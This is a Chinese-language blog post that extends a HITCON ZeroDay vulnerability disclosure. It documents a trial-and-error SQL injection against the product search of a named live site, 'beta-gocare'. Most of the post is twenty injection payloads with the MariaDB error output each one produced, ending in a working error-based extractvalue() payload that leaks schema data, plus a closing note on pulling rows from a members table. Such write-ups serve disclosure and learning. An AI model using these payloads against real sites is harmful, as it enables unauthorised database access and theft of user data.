---
title: SQL Injection beta-gocare Success
description: SQL Injection beta-gocare Success
last_update:
  date: "2025-08-20T08:00:00+08:00"
---

本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01026 的延伸

## 原始 SQL 語法

```sql
SELECT * FROM (`product_file`) WHERE ( name like '% userInput %' OR content like '% userInput %' OR memo like '% userInput %' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

<!-- ## 測試過程

1. `'`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%' OR content like '%'%' OR memo like '%'%' ) AND `display` = 'y' AND `sell_kind' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%'%' OR content like '%'%' OR memo like '%'%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

2. `' OR '1' = '1`

成功搜尋到

3. `' UNION SELECT 1-- 123`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT 1-- 123%' OR content like '%' UNION SELECT 1-- 123%' OR memo like '' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%' UNION SELECT 1-- 123%' OR content like '%' UNION SELECT 1-- 123%' OR memo like '%' UNION SELECT 1-- 123%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

完整的 SQL 語法都看到了

4. `') UNION SELECT 1-- 123`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT 1-- 123%' OR content like '%' UNION SELECT 1-- 123%' OR memo like '' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%' UNION SELECT 1-- 123%' OR content like '%' UNION SELECT 1-- 123%' OR memo like '%' UNION SELECT 1-- 123%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

好奇怪，`-- 123` 沒有把後面的 SQL 語法註解掉

5. `') UNION SELECT NULL-- 123`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'display' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%') UNION SELECT NULL-- 123%' OR content like '%') UNION SELECT NULL-- 123%' OR memo like '%') UNION SELECT NULL-- 123%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

6. `')#`

成功搜尋到，所以 `#` 可以成功註解(?

7. `') UNION SELECT 1#`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'display' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%') UNION SELECT 1#%' OR content like '%') UNION SELECT 1#%' OR memo like '%') UNION SELECT 1#%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

8. `'-- 123`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'LIMIT 12' at line 8

SELECT * FROM (`product_file`) WHERE ( name like '%'-- 123%' OR content like '%'-- 123%' OR memo like '%'-- 123%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

9. `')-- 123`

成功搜尋到

10. `%' ) UNION SELECT NULL AND ( '%' = '`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'content' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%%' ) UNION SELECT NULL AND ( '%' = '%' OR content like '%%' ) UNION SELECT NULL AND ( '%' = '%' OR memo like '%%' ) UNION SELECT NULL AND ( '%' = '%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

11. `%') UNION SELECT 1-- 123`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'display' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%%') UNION SELECT 1-- 123%' OR content like '%%') UNION SELECT 1-- 123%' OR memo like '%%') UNION SELECT 1-- 123%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

12. `%') UNION SELECT 1#`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'display' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%%') UNION SELECT 1#%' OR content like '%%') UNION SELECT 1#%' OR memo like '%%') UNION SELECT 1#%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

13. `%') UNION SELECT 1 OR ('1'='1`

```
A Database Error Occurred
Error Number: 1054

Unknown column 'content' in 'field list'

SELECT * FROM (`product_file`) WHERE ( name like '%%') UNION SELECT 1 OR ('1'='1%' OR content like '%%') UNION SELECT 1 OR ('1'='1%' OR memo like '%%') UNION SELECT 1 OR ('1'='1%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

推測應該是這邊正常

```sql
SELECT * FROM (`product_file`) WHERE ( name like '%%')
```

到了這邊就報錯，因為 `content` 已經離開前面的作用域

```sql
UNION SELECT 1 OR ('1'='1%' OR content like '%%')
```

14. `%' ) UNION (SELECT 'content' content, 'memo' memo AND '%' = '`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'AND '%' = '%' OR content like '%%' ) UNION (SELECT 'content' content, 'memo' mem' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%' ) UNION (SELECT 'content' content, 'memo' memo AND '%' = '%' OR content like '%%' ) UNION (SELECT 'content' content, 'memo' memo AND '%' = '%' OR memo like '%%' ) UNION (SELECT 'content' content, 'memo' memo AND '%' = '%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

15. `%' ) UNION SELECT 'content' content, 'memo' memo AND ('%' = '`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'AND ('%' = '%' OR content like '%%' ) UNION SELECT 'content' content, 'memo' mem' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%' ) UNION SELECT 'content' content, 'memo' memo AND ('%' = '%' OR content like '%%' ) UNION SELECT 'content' content, 'memo' memo AND ('%' = '%' OR memo like '%%' ) UNION SELECT 'content' content, 'memo' memo AND ('%' = '%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

16. `%' ) UNION SELECT 'content' as content, 'memo' as memo WHERE ('%' = '`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'WHERE ('%' = '%' OR content like '%%' ) UNION SELECT 'content' as content, 'memo' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%' ) UNION SELECT 'content' as content, 'memo' as memo WHERE ('%' = '%' OR content like '%%' ) UNION SELECT 'content' as content, 'memo' as memo WHERE ('%' = '%' OR memo like '%%' ) UNION SELECT 'content' as content, 'memo' as memo WHERE ('%' = '%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

17. `%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE '1'='1`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE '1'' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE '1'='1%' OR content like '%%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE '1'='1%' OR memo like '%%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE '1'='1%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

18. `%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%' OR content like '%%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name)' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' OR content like '%%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' OR memo like '%%' AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

19. `%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--`

```
A Database Error Occurred
Error Number: 1064

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%' OR content like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name' at line 3

SELECT * FROM (`product_file`) WHERE ( name like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' OR content like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' OR memo like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))--%' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

20. `%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))-- `

```
A Database Error Occurred
Error Number: 1105

XPATH syntax error: '~62~'

SELECT * FROM (`product_file`) WHERE ( name like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))-- %' OR content like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))-- %' OR memo like '%%') AND extractvalue(1,concat(0x7e,(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e))-- %' ) AND `display` = 'y' AND `sell_kind` > '0' AND `act_start` <= '2025-08-20' AND `act_end` >= '2025-08-20' LIMIT 12
```

成功提取到資料～果然 `UNION SELECT` 在這種複合式的查詢很難注入成功～

21. 接下來請參考 [ZD-2025-01026](https://zeroday.hitcon.org/vulnerability/ZD-2025-01026) -->

## 學到的東西

1. `UNION SELECT` 在實務上有點難成功
2. `extractvalue(1,concat(0x7e,(SELECT name FROM members LIMIT 0,1)`，如果 `members` 沒資料，整個 SQL 語法就不會噴錯(?)
